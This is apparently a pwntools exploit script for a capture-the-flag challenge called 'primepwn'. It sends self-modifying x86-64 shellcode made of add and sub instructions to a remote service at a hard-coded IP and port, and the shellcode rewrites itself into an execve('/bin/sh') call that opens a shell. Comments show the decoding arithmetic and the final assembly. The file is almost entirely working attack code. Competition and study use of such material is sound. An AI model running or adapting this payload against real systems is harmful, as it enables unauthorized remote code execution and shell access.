from pwn import *

r = process('./primepwn')
r = remote('35.198.178.224', 1337)

shellcode = '\x83\xc7\x7f\x83\xc7\x17\x83\x07\x05\x83\xc7\x03\x83\xef\x02\x83\x07\x05\x83\xc7\x02\x83\x07\x1f\x83\xc7\x03\x83\xef\x02\x83\x07\x02\x83\xc7\x03\x83\xef\x02\x83\x07\x03\x83\xc7\x02\x83\x07\x02\x83\xc7\x03\x83\xef\x02\x83\x07\x03\x83\xc7\x03\x83\xef\x02\x83\x2f\x02\x83\xc7\x03\x83\xef\x02\x83\x07\x07\x83\xc7\x03\x83\xef\x02\x83\x07\x05\x83\xc7\x02\x83\x07\x02\x83\xc7\x03\x83\xef\x02\x83\x07\x02\x83\xc7\x03\x83\xef\x02\x83\x07\x05\x83\xc7\x03\x83\xef\x02\x83\x07\x02\x83\xc7\x03\x83\xef\x02\x83\x07\x0b\x83\xc7\x03\x83\xef\x02\x83\x07\x02\x83\xc7\x03\x83\xef\x02\x83\x07\x05\x83\xc7\x02\x83\x07\x02\x43\xb3\x2f\x43\x67\x6b\x2f\x71\x65\x02\x49\x43\x89\xe5\x2f\xf1\x2f\xc7\x8b\x3d\x3b\x0d\x05'
# shellcode = '\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x31\xf6\x31\xd2\x8d\x42\x3b\x0f\x05'

r.send(shellcode.ljust(0x1000, '\x02'))

r.interactive()

# add edi,0x7f
# add edi,0x17
# add dword ptr [rdi],0x05
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x05
# add edi,0x02
# add dword ptr [rdi],0x1f
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x02
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x03
# add edi,0x02
# add dword ptr [rdi],0x02
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x03
# add edi,0x03
# sub edi,0x02
# sub dword ptr [rdi],0x02
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x07
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x05
# add edi,0x02
# add dword ptr [rdi],0x02
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x02
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x05
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x02
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x0b
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x02
# add edi,0x03
# sub edi,0x02
# add dword ptr [rdi],0x05
# add edi,0x02
# add dword ptr [rdi],0x02

# 0x96

# 0x43 + 0x05
# 0xb3 + 0x05
# 0x2f
# 0x43 + 0x1f
# 0x67 + 0x02
# 0x6b + 0x03
# 0x2f
# 0x71 + 0x02
# 0x65 + 0x03
# 0x02 - 0x02
# 0x49 + 0x07
# 0x43 + 0x05
# 0x89
# 0xe5 + 0x02
# 0x2f + 0x02
# 0xf1 + 0x05
# 0x2f + 0x02
# 0xc7 + 0x0b
# 0x8b + 0x02
# 0x3d + 0x05
# 0x3b
# 0x0d + 0x02
# 0x05

# mov rax, 0x68732f6e69622f
# push rax
# mov rdi,rsp
# xor esi,esi
# xor edx,edx
# lea eax,[rdx+59]
# syscall
